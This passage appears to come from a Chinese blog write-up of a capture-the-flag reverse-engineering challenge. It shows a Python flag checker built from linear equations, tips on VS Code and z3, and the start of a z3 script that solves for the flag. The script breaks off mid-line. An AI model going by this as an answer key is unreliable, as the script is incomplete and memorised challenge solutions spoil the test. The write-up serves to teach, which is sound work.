class="number">4</span>]) * <span class="number">1135</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">5095</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6962</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6481</span> +<span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7049</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">5995</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6233</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">1321</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4455</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">8181</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">5757</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">6953</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">3167</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5508</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">4602</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">1420</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">3075</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">25</span> == <span class="number">10167536</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1489</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9236</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7398</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4088</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">4131</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1657</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9068</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6420</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3970</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3265</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5343</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5386</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2583</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2813</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">7181</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9116</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4836</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6917</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">1123</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">7276</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2257</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">65</span> == <span class="number">10202212</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2097</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1253</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">1469</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">2731</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9565</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9185</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1095</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">8666</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2919</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7962</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1497</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">6642</span> +<span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4108</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6892</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">7161</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7552</span> +<span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">5666</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4060</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7799</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5080</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">8516</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">43</span> == <span class="number">10435786</span></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1461</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1676</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4755</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7982</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3860</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1067</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6715</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">4019</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4983</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2031</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1173</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2241</span> +<span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2594</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">8672</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4810</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7963</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">7749</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5730</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9855</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5858</span> +<span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2349</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">71</span> == <span class="number">9526385</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9025</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9536</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">1515</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8177</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6109</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">4856</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6692</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">4929</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1010</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3995</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">3511</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5910</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">3501</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3731</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6601</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">6200</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8177</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5488</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5957</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">9661</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4956</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">48</span> == <span class="number">11822714</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4462</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1940</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">5956</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4965</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9268</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9627</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">3564</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">5417</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2039</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7269</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9667</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">4158</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">2856</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2851</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9696</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5986</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6237</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">5845</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5467</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5227</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4771</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">72</span> == <span class="number">11486796</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4618</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8621</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">8144</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7115</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">1577</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">8602</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">3886</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3712</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1258</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">7063</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1872</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9855</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">4167</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">7615</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6298</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">7682</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8795</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3856</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">6217</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5764</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">5076</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">93</span> == <span class="number">11540145</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7466</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8442</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4822</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">7639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">2049</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7311</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5816</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">8433</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">5905</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4838</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">1251</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8184</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6465</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">4634</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">5513</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">3160</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6720</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">9205</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">6671</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">7716</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">1905</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">29</span> == <span class="number">12227250</span> </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">5926</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9095</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2048</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3035</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9560</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1591</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2392</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1812</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6732</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9454</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8175</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7346</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6333</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9812</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2034</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6634</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1762</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7058</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">3524</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">7462</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congratulate!!!You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;What a pity...Please try again &gt;__&lt;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>通过代码可以看出是一个21元的方程组，题目也提示可以使用z3写脚本来得到flag</p><blockquote><p>VScode多光标操作<br>alt+shift拖动可以在同一列添加多个光标<br>选中部分字符 ctrl+f2可以选中所有的相同字符<br>ctrl+&#96; 弹出终端面板</p></blockquote><blockquote><p>z3的使用说明<br>原文：<a class="link"   href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm" >https://ericpony.github.io/z3py-tutorial/guide-examples.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>用途：软件&#x2F;硬件的验证和测试，约束求解，混合系统分析，（安全性，生物，计算机分析，几何问题）<br>Linux安装z3<a class="link"   href="https://github.com/angr/angr-z3" >https://github.com/angr/angr-z3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>根据angr的源文件<a class="link"   href="https://github.com/bannsec/angr-Windows" >https://github.com/bannsec/angr-Windows <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>加了两个东西，详情去找新知\angr的安装</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *  <span class="comment">##导包</span></span><br><span class="line">flag = [Int(<span class="string">&quot;input[%d]&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]  <span class="comment">##设置的22个元</span></span><br><span class="line">s = Solver() <span class="comment">##定义的求解器</span></span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">7072</span> + flag[<span class="number">1</span>] * <span class="number">2523</span> + flag[<span class="number">2</span>] * <span class="number">6714</span> + flag[<span class="number">3</span>] * <span class="number">8810</span> +flag[<span class="number">4</span>] * <span class="number">6796</span> + flag[<span class="number">5</span>] * <span class="number">2647</span> + flag[<span class="number">6</span>] * <span class="number">1347</span> + flag[<span class="number">7</span>] * <span class="number">1289</span> + flag[<span class="number">8</span>] *<span class="number">8917</span> + flag[<span class="number">9</span>] * <span class="number">2304</span> + flag[<span class="number">10</span>] * <span class="number">5001</span> + flag[<span class="number">11</span>] * <span class="number">2882</span> + flag[<span class="number">12</span>] * <span class="number">7232</span> +flag[<span class="number">13</span>] * <span class="number">3192</span> + flag[<span class="number">14</span>] * <span class="number">9676</span> + flag[<span class="number">15</span>] * <span class="number">5436</span> + flag[<span class="number">16</span>] * <span class="number">4407</span> + flag[<span class="number">17</span>]* <span class="number">6269</span> + flag[<span class="number">18</span>] * <span class="number">9623</span> + flag[<span class="number">19</span>] * <span class="number">6230</span> + flag[<span class="number">20</span>] * <span class="number">6292</span> + flag[<span class="number">21</span>] * <span class="number">57</span> ==<span class="number">10743134</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">3492</span> + flag[<span class="number">1</span>] * <span class="number">1613</span> + flag[<span class="number">2</span>] * <span class="number">3234</span> + flag[<span class="number">3</span>] * <span class="number">5656</span> +flag[<span class="number">4</span>] * <span class="number">9182</span> + flag[<span class="number">5</span>] * <span class="number">4240</span> + flag[<span class="number">6</span>] * <span class="number">8808</span> + flag[<span class="number">7</span>] * <span class="number">9484</span> + flag[<span class="number">8</span>] *<span class="number">4000</span> + flag[<span class="number">9</span>] * <span class="number">1475</span> + flag[<span class="number">10</span>] * <span class="number">2616</span> + flag[<span class="number">11</span>] * <span class="number">2766</span> + flag[<span class="number">12</span>] * <span class="number">6822</span> +flag[<span class="number">13</span>] * <span class="number">1068</span> + flag[<span class="number">14</span>] * <span class="number">9768</span> + flag[<span class="number">15</span>] * <span class="number">1420</span> + flag[<span class="number">16</span>] * <span class="number">4528</span> + flag[<span class="number">17</span>]* <span class="number">1031</span> + flag[<span class="number">18</span>] * <span class="number">8388</span> + flag[<span class="number">19</span>] * <span class="number">2029</span> + flag[<span class="number">20</span>] * <span class="number">2463</span> + flag[<span class="number">21</span>] * <span class="number">32</span> ==<span class="number">9663091</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9661</span> + flag[<span class="number">1</span>] * <span class="number">1108</span> + flag[<span class="number">2</span>] * <span class="number">2229</span> + flag[<span class="number">3</span>] * <span class="number">1256</span> +flag[<span class="number">4</span>] * <span class="number">7747</span> + flag[<span class="number">5</span>] * <span class="number">5775</span> + flag[<span class="number">6</span>] * <span class="number">5211</span> + flag[<span class="number">7</span>] * <span class="number">2387</span> + flag[<span class="number">8</span>] *<span class="number">1997</span> + flag[<span class="number">9</span>] * <span class="number">4045</span> + flag[<span class="number">10</span>] * <span class="number">7102</span> + flag[<span class="number">11</span>] * <span class="number">7853</span> + flag[<span class="number">12</span>] * <span class="number">5596</span> +flag[<span class="number">13</span>] * <span class="number">6952</span> + flag[<span class="number">14</span>] * <span class="number">8883</span> + flag[<span class="number">15</span>] * <span class="number">5125</span> + flag[<span class="number">16</span>] * <span class="number">9572</span> + flag[<span class="number">17</span>]* <span class="number">1149</span> + flag[<span class="number">18</span>] * <span class="number">7583</span> + flag[<span class="number">19</span>] * <span class="number">1075</span> + flag[<span class="number">20</span>] * <span class="number">9804</span> + flag[<span class="number">21</span>] * <span class="number">72</span> ==<span class="number">10521461</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">4314</span> + flag[<span class="number">1</span>] * <span class="number">3509</span> + flag[<span class="number">2</span>] * <span class="number">6200</span> + flag[<span class="number">3</span>] * <span class="number">5546</span> +flag[<span class="number">4</span>] * <span class="number">1705</span> + flag[<span class="number">5</span>] * <span class="number">9518</span> + flag[<span class="number">6</span>] * <span class="number">2975</span> + flag[<span class="number">7</span>] * <span class="number">2689</span> + flag[<span class="number">8</span>] *<span class="number">2412</span> + flag[<span class="number">9</span>] * <span class="number">8659</span> + flag[<span class="number">10</span>] * <span class="number">5459</span> + flag[<span class="number">11</span>] * <span class="number">7572</span> + flag[<span class="number">12</span>] * <span class="number">3042</span> +flag[<span class="number">13</span>] * <span class="number">9701</span> + flag[<span class="number">14</span>] * <span class="number">4697</span> + flag[<span class="number">15</span>] * <span class="number">9863</span> + flag[<span class="number">16</span>] * <span class="number">1296</span> + flag[<span class="number">17</span>]* <span class="number">1278</span> + flag[<span class="number">18</span>] * <span class="number">5721</span> + flag[<span class="number">19</span>] * <span class="number">5116</span> + flag[<span class="number">20</span>] * <span class="number">4147</span> + flag[<span class="number">21</span>] * <span class="number">52</span> ==<span class="number">9714028</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2310</span> + flag[<span class="number">1</span>] * <span class="number">1379</span> + flag[<span class="number">2</span>] * <span class="number">5900</span> + flag[<span class="number">3</span>] * <span class="number">4876</span> +flag[<span class="number">4</span>] * <span class="number">5329</span> + flag[<span class="number">5</span>] * <span class="number">6485</span> + flag[<span class="number">6</span>] * <span class="number">6610</span> + flag[<span class="number">7</span>] * <span class="number">7179</span> + flag[<span class="number">8</span>] *<span class="number">7897</span> + flag[<span class="number">9</span>] * <span class="number">1094</span> + flag[<span class="number">10</span>] * <span class="number">4825</span> + flag[<span class="number">11</span>] * <span class="number">8101</span> + flag[<span class="number">12</span>] * <span class="number">9519</span> +flag[<span class="number">13</span>] * <span class="number">3048</span> + flag[<span class="number">14</span>] * <span class="number">3168</span> + flag[<span class="number">15</span>] * <span class="number">2775</span> + flag[<span class="number">16</span>] * <span class="number">4366</span> + flag[<span class="number">17</span>]* <span class="number">4066</span> + flag[<span class="number">18</span>] * <span class="number">7490</span> + flag[<span class="number">19</span>] * <span class="number">5533</span> + flag[<span class="number">20</span>] * <span class="number">2139</span> + flag[<span class="number">21</span>] * <span class="number">87</span> ==<span class="number">10030960</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">1549</span> + flag[<span class="number">1</span>] * <span class="number">8554</span> + flag[<span class="number">2</span>] * <span class="number">6510</span> + flag[<span class="number">3</span>] * <span class="number">6559</span> +flag[<span class="number">4</span>] * <span class="number">5570</span> + flag[<span class="number">5</span>] * <span class="number">1003</span> + flag[<span class="number">6</span>] * <span class="number">8562</span> + flag[<span class="number">7</span>] * <span class="number">6793</span> + flag[<span class="number">8</span>] *<span class="number">3509</span> + flag[<span class="number">9</span>] * <span class="number">4965</span> + flag[<span class="number">10</span>] * <span class="number">6111</span> + flag[<span class="number">11</span>] * <span class="number">1229</span> + flag[<span class="number">12</span>] * <span class="number">5654</span> +flag[<span class="number">13</span>] * <span class="number">2204</span> + flag[<span class="number">14</span>] * <span class="number">2217</span> + flag[<span class="number">15</span>] * <span class="number">5039</span> + flag[<span class="number">16</span>] * <span class="number">5657</span> + flag[<span class="number">17</span>]* <span class="number">9426</span> + flag[<span class="number">18</span>] * <span class="number">7604</span> + flag[<span class="number">19</span>] * <span class="number">5883</span> + flag[<span class="number">20</span>] * <span class="number">5285</span> + flag[<span class="number">21</span>] * <span class="number">17</span> ==<span class="number">10946682</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">2678</span> + flag[<span class="number">1</span>] * <span class="number">4369</span> + flag[<span class="number">2</span>] * <span class="number">7509</span> + flag[<span class="number">3</span>] * <span class="number">1564</span> +flag[<span class="number">4</span>] * <span class="number">7777</span> + flag[<span class="number">5</span>] * <span class="number">2271</span> + flag[<span class="number">6</span>] * <span class="number">9696</span> + flag[<span class="number">7</span>] * <span class="number">3874</span> + flag[<span class="number">8</span>] *<span class="number">2212</span> + flag[<span class="number">9</span>] * <span class="number">6764</span> + flag[<span class="number">10</span>] * <span class="number">5727</span> + flag[<span class="number">11</span>] * <span class="number">5971</span> + flag[<span class="number">12</span>] * <span class="number">5876</span> +flag[<span class="number">13</span>] * <span class="number">9959</span> + flag[<span class="number">14</span>] * <span class="number">4604</span> + flag[<span class="number">15</span>] * <span class="number">8461</span> + flag[<span class="number">16</span>] * <span class="number">2350</span> + flag[<span class="number">17</span>]* <span class="number">3564</span> + flag[<span class="number">18</span>] * <span class="number">1831</span> + flag[<span class="number">19</span>] * <span class="number">6088</span> + flag[<span class="number">20</span>] * <span class="number">4575</span> + flag[<span class="number">21</span>] * <span class="number">9</span> ==<span class="number">10286414</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">8916</span> + flag[<span class="number">1</span>] * <span class="number">8647</span> + flag[<span class="number">2</span>] * <span class="number">4522</span> + flag[<span class="number">3</span>] * <span class="number">3579</span> +flag[<span class="number">4</span>] * <span class="number">5319</span> + flag[<span class="number">5</span>] * <span class="number">9124</span> + flag[<span class="number">6</span>] * <span class="number">9535</span> + flag[<span class="number">7</span>] * <span class="number">5125</span> + flag[<span class="number">8</span>] *<span class="number">3235</span> + flag[<span class="number">9</span>] * <span class="number">3246</span> + flag[<span class="number">10</span>] * <span class="number">3378</span> + flag[<span class="number">11</span>] * <span class="number">9221</span> + flag[<span class="number">12</span>] * <span class="number">1875</span> +flag[<span class="number">13</span>] * <span class="number">1008</span> + flag[<span class="number">14</span>] * <span class="number">6262</span> + flag[<span class="number">15</span>] * <span class="number">1524</span> + flag[<span class="number">16</span>] * <span class="number">8851</span> + flag[<span class="number">17</span>]* <span class="number">4367</span> + flag[<span class="number">18</span>] * <span class="number">7628</span> + flag[<span class="number">19</span>] * <span class="number">9404</span> + flag[<span class="number">20</span>] * <span class="number">2065</span> + flag[<span class="number">21</span>] * <span class="number">9</span> ==<span class="number">11809388</span>)</span><br><span class="line">s.add(flag[<span class="number">0</span>] * <span class="number">9781</span> + flag[<span class="number">1</span>] * <span class="number">9174</span> + flag[<span class="number">2</span>] * <span class="number">3771</span> + flag[<span class="number">3</span>] * <span class="number">6972</span> +flag[<span class="number">4</span>] * <span class="number">6425</span> + flag[<span class="number">5</span>] * <span class="number">7631</span> + flag[<span class="number">6</span>] * <span class="number">8864</span> + flag[<span class="number">7</span>] * <span class="number">9117</span> + flag[<span class="number">8</span>] *<span class="number">4328</span> + flag[<span class="number">9</span>] * <span class="number">3919</span> + flag[<span class="number">10</span>] * <span class="number">6517</span> + flag[<span class="number">11</span>] * <span class="number">7165</span> + flag[<span class="number">12</span>] * <span class="number">6895</span> +flag[<span 